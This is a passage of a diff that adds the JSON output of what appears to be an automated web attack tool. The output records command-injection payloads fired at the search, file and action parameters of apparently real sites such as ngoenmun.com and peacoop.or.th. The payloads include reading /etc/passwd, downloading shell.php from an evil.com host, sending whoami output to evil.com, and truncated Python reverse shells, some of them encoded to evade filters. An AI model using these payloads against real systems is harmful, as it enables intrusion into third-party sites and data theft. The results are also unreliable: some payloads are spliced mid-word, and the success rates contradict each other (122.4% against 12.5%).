+        },
+        {
+          "parameter": "search",
+          "payload": ";\twhoami",
+          "indicator": "root",
+          "response_length": 27697
+        },
+        {
+          "parameter": "search",
+          "payload": "%2526%2520hostname",
+          "indicator": "root",
+          "response_length": 27707
+        },
+        {
+          "parameter": "search",
+          "payload": "`WgeT HTtp://EVil.COM/sHelL.php`",
+          "indicator": "root",
+          "response_length": 27729
+        },
+        {
+          "parameter": "search",
+          "payload": "$/**(uname/**/-a)**/",
+          "indicator": "root",
+          "response_length": 27731
+        },
+        {
+          "parameter": "search",
+          "payload": "%2524%2528uname%2520-a%2529",
+          "indicator": "root",
+          "response_length": 27720
+        },
+        {
+          "parameter": "search",
+          "payload": "|\tps\taux",
+          "indicator": "root",
+          "response_length": 27699
+        },
+        {
+          "parameter": "search",
+          "payload": "| ps aux",
+          "indicator": "root",
+          "response_length": 27695
+        },
+        {
+          "parameter": "search",
+          "payload": "| ID",
+          "indicator": "root",
+          "response_length": 27691
+        },
+        {
+          "parameter": "search",
+          "payload": "%60cat%20/etc/passwd%60",
+          "indicator": "root",
+          "response_length": 27718
+        },
+        {
+          "parameter": "search",
+          "payload": "%7C%20id",
+          "indicator": "root",
+          "response_length": 27697
+        },
+        {
+          "parameter": "search",
+          "payload": "& curl http://evort socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec...",
+          "indicator": "root",
+          "response_length": 28017
+        },
+        {
+          "parameter": "search",
+          "payload": "; ls aux",
+          "indicator": "root",
+          "response_length": 27695
+        },
+        {
+          "parameter": "file",
+          "payload": "& curl http://ev\u0000il.com/$(whoami)",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "file",
+          "payload": "; id",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "file",
+          "payload": "; netstat -an\u0000",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "file",
+          "payload": "; whoami\u0000",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "file",
+          "payload": "&\thostname",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "file",
+          "payload": "& ho aux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "file",
+          "payload": "%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csock...",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "file",
+          "payload": "; lststat -an",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "file",
+          "payload": ";\twhoami",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "file",
+          "payload": "%2526%2520hostname",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "file",
+          "payload": "`WgeT HTtp://EVil.COM/sHelL.php`",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "file",
+          "payload": "$/**(uname/**/-a)**/",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "file",
+          "payload": "%2524%2528uname%2520-a%2529",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "file",
+          "payload": "|\tps\taux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "file",
+          "payload": "| ps aux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "file",
+          "payload": "| ID",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "file",
+          "payload": "%60cat%20/etc/passwd%60",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "file",
+          "payload": "%7C%20id",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "file",
+          "payload": "& curl http://evort socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec...",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "file",
+          "payload": "; ls aux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "action",
+          "payload": "& curl http://ev\u0000il.com/$(whoami)",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "action",
+          "payload": "; id",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "action",
+          "payload": "; netstat -an\u0000",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "action",
+          "payload": "; whoami\u0000",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "action",
+          "payload": "&\thostname",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "action",
+          "payload": "& ho aux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "action",
+          "payload": "%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csock...",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "action",
+          "payload": "; lststat -an",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "action",
+          "payload": ";\twhoami",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "action",
+          "payload": "%2526%2520hostname",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "action",
+          "payload": "`WgeT HTtp://EVil.COM/sHelL.php`",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "action",
+          "payload": "$/**(uname/**/-a)**/",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "action",
+          "payload": "%2524%2528uname%2520-a%2529",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "action",
+          "payload": "|\tps\taux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "action",
+          "payload": "| ps aux",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "action",
+          "payload": "| ID",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "action",
+          "payload": "%60cat%20/etc/passwd%60",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "action",
+          "payload": "%7C%20id",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "action",
+          "payload": "& curl http://evort socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec...",
+          "indicator": "root",
+          "response_length": 76000
+        },
+        {
+          "parameter": "action",
+          "payload": "; ls aux",
+          "indicator": "root",
+          "response_length": 76000
+        }
+      ],
+      "failed_attempts": 0,
+      "success_rate": 100.0
+    },
+    {
+      "target": "https://ngoenmun.com",
+      "vector_type": "rce",
+      "timestamp": "2025-10-28 13:01:18",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0.0
+    },
+    {
+      "target": "https://ngoenmun.com",
+      "vector_type": "sql_injection",
+      "timestamp": "2025-10-28 13:01:05",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0.0
+    },
+    {
+      "target": "https://peacoop.or.th",
+      "vector_type": "sql_injection",
+      "timestamp": "2025-10-28 12:59:28",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0.0
+    }
+  ],
+  "summary": {
+    "total_successful_payloads": 459,
+    "overall_success_rate": 122.39999999999999,
+    "vector_effectiveness": {
+      "ssrf": {
+        "success_count": 0,
+        "total_payloads": 0
+      },
+      "file_upload": {
+        "success_count": 0,
+        "total_payloads": 0
+      },
+      "xss": {
+        "success_count": 139,
+        "total_payloads": 456
+      },
+      "lfi": {
+        "success_count": 0,
+        "total_payloads": 128
+      },
+      "rce": {
+        "success_count": 320,
+        "total_payloads": 508
+      },
+      "sql_injection": {
+        "success_count": 0,
+        "total_payloads": 408
+      }
+    },
+    "most_effective_vector": "rce",
+    "attack_success_rate": "12.5%"
+  }
+}
